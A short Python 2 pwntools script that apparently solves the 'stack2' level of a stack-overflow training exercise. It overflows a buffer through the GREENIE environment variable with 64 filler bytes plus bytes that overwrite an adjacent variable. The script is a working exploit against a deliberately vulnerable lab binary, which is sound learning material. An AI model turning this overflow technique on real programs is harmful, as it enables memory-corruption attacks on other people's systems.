#!/usr/bin/python
from pwn import process

v = 'A'*64+'\x0a\x0d\x0a\x0d'
p = process("./stack2", env={"GREENIE":v})
print p.readline()

